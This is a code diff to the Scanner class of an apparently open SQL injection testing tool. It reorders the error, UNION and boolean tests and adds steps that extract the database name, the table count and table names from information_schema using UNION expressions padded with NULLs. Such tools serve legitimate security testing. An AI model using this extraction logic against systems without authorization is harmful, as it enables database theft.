@@ -1,4 +1,4 @@
-from utils.constants import RESET, YELLOW
+from utils.constants import HEIGH_ELEMENT_COUNT, RESET, YELLOW
 from utils.parser import extract_params
 from core.Requester import Requester
 from core.Analyzer import Analyzer
@@ -25,6 +25,7 @@ class Scanner:
 		self.time = time
 		self.extract = extract
 
+
 	def scan(self, url: str):
 		params = extract_params(url)
 
@@ -36,9 +37,23 @@ class Scanner:
 		results = []
 
 		for param in params:
-			print('\n')
 			Logger.info(f"---------- Testing parameter: `{param}` ----------\n")
-   
+
+			print()
+			Logger.info("Running injections...\n")
+
+
+			"""
+			Run an error based test
+   			"""
+
+			payload, database = self.error.test(url, param)
+			is_error = True if payload else False
+			if is_error:
+				Logger.success(f"Error based injection successful!")
+			else:
+				Logger.failure(f"Error based injection unsuccessful")
+
 
 			"""
 			Detect context (check how the target SQL query is formed)
@@ -59,9 +74,19 @@ class Scanner:
 				Logger.error("Failed to get column count for the SQL query")
 				continue
 			Logger.success(f"Found column count: {YELLOW}{column_count}{RESET}")
+   
 
-			print()
-			Logger.info("Running injections...\n")
+			"""
+			Run a UNION based test
+   			"""
+
+			is_union = self.union.test_marker(url, param, context, column_count)
+			if is_union:
+				Logger.success(f"UNION based injection successful!")
+				# Logger.debug(tables)
+			else:
+				Logger.failure(f"UNION based injection unsuccessful")
+
 
 			"""
 			Run a boolean based test
@@ -70,39 +95,39 @@ class Scanner:
 			is_bool = self.boolean.test(url, param, context)
 			if is_bool:
 				Logger.success(f"Boolean based injection successful!")
-				db_name = self.extract.get_db_name(url, param, context, column_count)
-				if db_name:
-					Logger.success(f"Found database name: {YELLOW}{db_name}{RESET}!\n")
+				if is_union:
+					# Create a NULL list matching the number of columns to make query compatible.
+					# We substract 1 from count because the main element is added afterwards 
+					nulls = ",".join(["NULL"] * (column_count - 1))
+    
+					union_expression = f"database(),{nulls}"
+  
+					db_name = self.extract.find_expressions_name(
+						url, param, context, column_count, "database()", union_expression,
+					)
+					if db_name:
+						Logger.success(f"Found database name: {YELLOW}{db_name}{RESET}!\n")
+
+					expression = "(SELECT table_name FROM information_schema.tables LIMIT 0,1)"
+					# Limit is one further as it prints the first SELECT results at index 0
+					union_expression = f"SELECT table_name,{nulls} FROM information_schema.tables LIMIT 0,1"
+
+					# Get the expression's name length
+					table_count_expression = f"(SELECT COUNT(*) FROM information_schema.tables)"
+					table_count = self.boolean.get_number_returned_by_sql(
+						url, param, context, table_count_expression, HEIGH_ELEMENT_COUNT
+					)
+					Logger.success(f"Found table count: {YELLOW}{table_count}{RESET}")
+
+
+					table_name = self.extract.find_expressions_name(
+						url, param, context, column_count,
+						expression, union_expression
+					)
+					if table_name:
+						Logger.success(f"Found table name: {YELLOW}{table_name}{RESET}!\n")
 			else:
 				Logger.failure(f"Boolean based injection unsuccessful")
-
-
-			"""
-			Run an error based test
-   			"""
-
-			payload, database = self.error.test(url, param)
-			is_error = True if payload else False
-			if is_error:
-				Logger.success(f"Error based injection successful!")
-			else:
-				Logger.failure(f"Error based injection unsuccessful")
-
-
-			"""
-			Run a UNION based test
-   			"""
-
-			# db = self.union.test_db_name(url, param)
-			db = None
-			tables = self.union.test_tables(url, param, context, column_count)
-			if tables:
-				Logger.success(f"UNION based injection successful!")
-				# Logger.debug(tables)
-			else:
-				Logger.failure(f"UNION based injection unsuccessful")
-
-			is_union = True if db or tables else False
 
 
 			"""
@@ -135,8 +160,8 @@ class Scanner:
 
 				"union": {
 					"detected": is_union,
-					"database": db,
-					"tables": tables,
+					# "database": db,
+					# "tables": tables,
 				#	"columns": {...},
 				#	"dump": [...]
 				},
